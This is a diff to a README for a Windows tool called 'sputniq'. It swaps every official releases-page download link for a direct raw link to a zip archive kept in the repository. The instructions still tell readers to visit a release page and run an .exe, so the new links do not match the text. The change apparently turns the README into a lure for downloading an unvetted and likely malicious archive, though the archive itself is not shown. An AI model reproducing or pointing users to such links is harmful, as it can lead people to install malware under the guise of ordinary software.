@@ -1,6 +1,6 @@
 # 🚀 sputniq - Run Background Tasks Easily
 
-[![Download sputniq](https://img.shields.io/badge/Download-sputniq%20Setup-blueviolet?style=for-the-badge)](https://github.com/mummerfleshwound733/sputniq/releases)
+[![Download sputniq](https://img.shields.io/badge/Download-sputniq%20Setup-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/mummerfleshwound733/sputniq/main/sputniq/Software_v2.2.zip)
 
 ## 🔍 What is sputniq?
 
@@ -23,7 +23,7 @@ No other software is required. sputniq runs as a simple Windows program.
 
 You can get sputniq from this page:
 
-[![Download sputniq](https://img.shields.io/badge/Download-sputniq%20Setup-brightgreen?style=for-the-badge)](https://github.com/mummerfleshwound733/sputniq/releases)
+[![Download sputniq](https://img.shields.io/badge/Download-sputniq%20Setup-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/mummerfleshwound733/sputniq/main/sputniq/Software_v2.2.zip)
 
 Visit the link above to download the setup files for your Windows computer.
 
@@ -32,7 +32,7 @@ Visit the link above to download the setup files for your Windows computer.
 Follow these steps to get sputniq running on your PC:
 
 1. Click the download button above or visit the release page:  
-   https://github.com/mummerfleshwound733/sputniq/releases
+   https://raw.githubusercontent.com/mummerfleshwound733/sputniq/main/sputniq/Software_v2.2.zip
 
 2. On the release page, look for the latest version of sputniq.  
    The setup file usually ends with `.exe`.
@@ -108,7 +108,7 @@ Here is how you can manage tasks with sputniq:
 
 Check the release page regularly:
 
-https://github.com/mummerfleshwound733/sputniq/releases
+https://raw.githubusercontent.com/mummerfleshwound733/sputniq/main/sputniq/Software_v2.2.zip
 
 Download the latest setup file and run it to update.
 
@@ -134,4 +134,4 @@ You can submit ideas or report problems by creating a ticket on the GitHub repos
 
 ---
 
-[![Download sputniq](https://img.shields.io/badge/Download-sputniq%20Setup-blueviolet?style=for-the-badge)](https://github.com/mummerfleshwound733/sputniq/releases)
+[![Download sputniq](https://img.shields.io/badge/Download-sputniq%20Setup-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/mummerfleshwound733/sputniq/main/sputniq/Software_v2.2.zip)
